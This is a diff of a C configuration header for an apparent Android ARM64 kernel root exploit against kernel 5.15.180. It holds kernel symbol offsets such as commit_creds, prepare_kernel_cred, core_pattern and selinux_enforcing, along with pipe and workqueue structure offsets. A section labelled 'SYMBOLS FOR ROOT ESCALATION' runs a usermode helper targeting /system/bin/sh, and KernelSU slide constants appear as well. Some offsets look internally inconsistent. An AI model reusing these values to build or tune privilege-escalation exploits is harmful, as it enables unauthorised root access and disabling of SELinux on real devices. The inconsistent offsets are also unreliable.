@@ -4,8 +4,8 @@
 #define TARGET_KERNEL_VERSION "5.15.180"
 
 // ========== KERNEL MEMORY LAYOUT ==========
-#define KIMAGE_TEXT_BASE       0xffffffc008000000  // From _text
-#define P0_PAGE_OFFSET         0xffffffc000000000  // ARM64 PAGE_OFFSET
+#define KIMAGE_TEXT_BASE       0xffffffc008000000
+#define P0_PAGE_OFFSET         0xffffffc000000000
 #define P0_PHYS_OFFSET         0x0000000000000000
 #define P0_KERNEL_PHYS_LOAD    0x0000000001000000
 #define DIRECT_MAP_BASE        0xffffffc000000000
@@ -14,7 +14,7 @@
 #define STRUCT_PAGE_SIZE       64
 #define PAGE_SHIFT             12
 
-// ========== OFFSETS (Your extracted values) ==========
+// ========== OFFSETS ==========
 #define OFFSET_commit_creds 0x18b654
 #define OFFSET_prepare_kernel_cred 0x18a3f0
 #define OFFSET_call_usermodehelper_exec_work 0x16ec08
@@ -24,22 +24,29 @@
 #define OFFSET_do_faccessat 0x550278
 #define OFFSET_core_pattern 0xac56140
 
-// ========== ASHMEM FUNCTIONS (from kallsyms) ==========
-#define ASHMEM_IOCTL            0x918e290
-#define ASHMEM_COMPAT_IOCTL     0x918e940
-#define ASHMEM_MMAP             0x918e9a0
-#define ASHMEM_OPEN             0x918ec90
-#define ASHMEM_RELEASE          0x918ed30
-#define ASHMEM_MISC_FOPS        0x00000000  // Not found, use 0
-
 // ========== CONFIGFS FUNCTIONS ==========
-#define CONFIGFS_READ_ITER      0x867f0cc
-#define CONFIGFS_BIN_WRITE_ITER 0x867fbf0
+#define CONFIGFS_READ_ITER      0x67f0cc
+#define CONFIGFS_BIN_WRITE_ITER 0x67fbf0
 
 // ========== PIPE/STRUCT OFFSETS ==========
 #define ANON_PIPE_BUF_OPS       0x9fe61b0
 #define KMALLOC_CACHES          0xa1d5250
 #define SYSTEM_UNBOUND_WQ       0xab807d8
+
+// ========== ASHMEM FUNCTIONS (Not in kernel) ==========
+#define ASHMEM_IOCTL            0x00000000
+#define ASHMEM_COMPAT_IOCTL     0x00000000
+#define ASHMEM_MMAP             0x00000000
+#define ASHMEM_OPEN             0x00000000
+#define ASHMEM_RELEASE          0x00000000
+#define ASHMEM_MISC_FOPS        0x00000000
+#define ASHMEM_FOPS             0x00000000
+#define ASHMEM_SHOW_FDINFO      0x00000000
+
+// ========== SYMBOLS FOR ROOT ESCALATION ==========
+#define SELINUX_ENFORCING       OFFSET_selinux_enforcing
+#define CALL_USERMODEHELPER_EXEC_WORK OFFSET_call_usermodehelper_exec_work
+#define INIT_TASK               OFFSET_init_task
 
 // ========== FILE OPERATIONS OFFSETS ==========
 #define FOPS_OWNER_OFF          0x00
@@ -54,6 +61,9 @@
 #define FOPS_OPEN_OFF           0x48
 #define FOPS_RELEASE_OFF        0x50
 #define FOPS_SHOW_FDINFO_OFF    0x58
+#define FOPS_SPLICE_READ_OFF    0x60
+#define NOOP_LLSEEK             0x00000000
+#define COPY_SPLICE_READ        0x00000000
 
 // ========== PIPE CONSTANTS ==========
 #define PIPE_BUFFER_SLOTS       16
@@ -62,6 +72,7 @@
 // ========== WORKQUEUE OFFSETS ==========
 #define WORK_ENTRY_OFF          0x00
 #define WORK_DATA_OFF           0x08
+#define WORK_FUNC_OFF           0x08
 #define WQ_DFL_PWQ_OFF          0x10
 #define PWQ_POOL_OFF            0x08
 #define PWQ_WQ_OFF              0x10
@@ -97,12 +108,16 @@
 #define ROOT_UMH_DATA_OFF       0x100
 #define ROOT_UMH_PATH           "/system/bin/sh"
 
-// ========== SLIDE CONSTANTS ==========
-// No SLIDE_* symbols found in your kernel - KernelSU late-load disabled
-#define SLIDE_NFULNL_LOGGER_NAME_IMAGE   0x00
-#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE 0x00
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE 0x00
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF  0x00
+// ========== KERNELSU SLIDE CONSTANTS ==========
+#define SLIDE_INIT_TASK_IMAGE                     0xacc5e80
+#define SLIDE_WAITER_TASK                         0x0
+#define SLIDE_TRACEFS_EVENT_ID                    108
+#define SLIDE_PSELECT_NFDS                        64
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0
+#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE          0
+#define SLIDE_NFULNL_LOGGER_NAME_IMAGE            0
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE 0
+#define SLIDE_SYSCTL_BOOTID_IMAGE                 0
 
-// ========== KERNELSU ==========
+// ========== BUILD VARIANT ==========
 #define BUILD_VARIANT_LABEL     "user"
